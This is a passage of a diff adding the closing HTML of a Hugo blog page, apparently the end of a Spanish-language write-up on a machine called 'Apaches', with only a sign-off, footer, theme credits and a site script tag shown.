+</span></span></code></pre></div><p>Y aquí termina la máquina Apaches.</p>
+<p>Saludos!</p>
+
+            </div>
+        </article>
+    </main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
+        theme on
+        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+    
+    
+    <script src="https://0x-noname.github.io/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>
+
+
+    </body>
+</html>
